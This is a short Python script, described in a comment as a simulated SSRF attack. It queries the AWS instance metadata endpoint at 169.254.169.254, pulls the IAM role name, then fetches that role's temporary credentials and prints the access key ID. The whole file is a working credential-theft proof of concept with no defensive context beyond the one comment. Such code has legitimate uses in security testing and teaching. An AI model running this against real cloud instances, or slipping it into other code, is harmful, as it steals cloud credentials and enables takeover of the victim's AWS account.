#!/usr/bin/env python3
import requests

# Simulate SSRF from vulnerable web app
target_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

r = requests.get(target_url)
if r.status_code == 200:
    role = r.text.strip()
    print(f"[+] Role found: {role}")
    
    creds_url = f"{target_url}{role}"
    creds = requests.get(creds_url).json()
    print(f"[+] Credentials obtained: {creds['AccessKeyId']}")
else:
    print("[-] IMDS not accessible")
